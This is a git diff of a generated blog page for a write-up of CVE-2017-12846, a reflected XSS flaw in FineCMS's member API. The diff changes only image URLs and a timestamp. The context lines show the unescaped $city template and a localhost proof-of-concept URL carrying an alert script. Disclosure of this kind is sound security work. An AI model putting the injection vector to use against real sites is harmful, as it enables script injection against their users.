@@ -92,14 +92,14 @@ Third-party platforms are invoked here, but the filtering is not strictly enforc
 <meta property="og:description" content="CVE-2017-12846the problem is in /finecms/dayrui/controllers/member/api.php
 Third-party platforms are invoked here, but the filtering is not strictly enforced.The vulnerability function is as follows
 1">
-<meta property="og:image" content="http://olgkg6ct5.bkt.clouddn.com/finecms.PNG">
-<meta property="og:updated_time" content="2017-08-15T01:20:54.000Z">
+<meta property="og:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/finecms.PNG">
+<meta property="og:updated_time" content="2018-11-15T04:53:56.670Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="The latest version of finecms unlimited XSS">
 <meta name="twitter:description" content="CVE-2017-12846the problem is in /finecms/dayrui/controllers/member/api.php
 Third-party platforms are invoked here, but the filtering is not strictly enforced.The vulnerability function is as follows
 1">
-<meta name="twitter:image" content="http://olgkg6ct5.bkt.clouddn.com/finecms.PNG">
+<meta name="twitter:image" content="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/finecms.PNG">
 
 
 
@@ -441,7 +441,7 @@ Third-party platforms are invoked here, but the filtering is not strictly enforc
 <figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">​<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"toolbar"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"selCity"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"mark"</span> <span class="attr">onClick</span>=<span class="string">"addMarker();"</span>&gt;</span>&#123;fc_lang('添加标注')&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">onClick</span>=<span class="string">"removeMarker();"</span> <span class="attr">class</span>=<span class="string">"map"</span>&gt;</span>&#123;fc_lang('重置地图')&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">strong</span> <span class="attr">id</span>=<span class="string">"curCity"</span>&gt;</span>&#123;$city&#125;<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> [<span class="tag">&lt;<span class="name">a</span> <span class="attr">onClick</span>=<span class="string">"mapClose();"</span> <span class="attr">id</span>=<span class="string">"curCityText"</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span>&#123;fc_lang('更换城市')&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span>]</div><div class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
 <p>You can see that our $city variable is injected directly into the &lt; strong &gt; label, so we can construct the payload directly</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">​http://localhost/index.php?s=member&amp;c=api&amp;m=baidumap&amp;city=&lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt;&amp;value=123</div></pre></td></tr></table></figure>
-<p><img src="http://olgkg6ct5.bkt.clouddn.com/finecms.PNG" alt=""><br>(not just baidumap, the upload and other functions on the back of the page have this situation, the same solution)<br>​</p>
+<p><img src="https://pupiles-1253357925.cos.ap-chengdu.myqcloud.com/finecms.PNG" alt=""><br>(not just baidumap, the upload and other functions on the back of the page have this situation, the same solution)<br>​</p>
 
       
     </div>
